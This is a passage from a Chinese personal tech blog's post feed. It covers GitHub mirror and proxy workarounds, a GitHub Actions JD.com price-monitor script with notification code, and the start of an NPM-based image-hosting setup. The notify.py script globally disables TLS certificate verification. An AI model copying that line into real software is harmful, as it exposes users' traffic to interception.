为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span 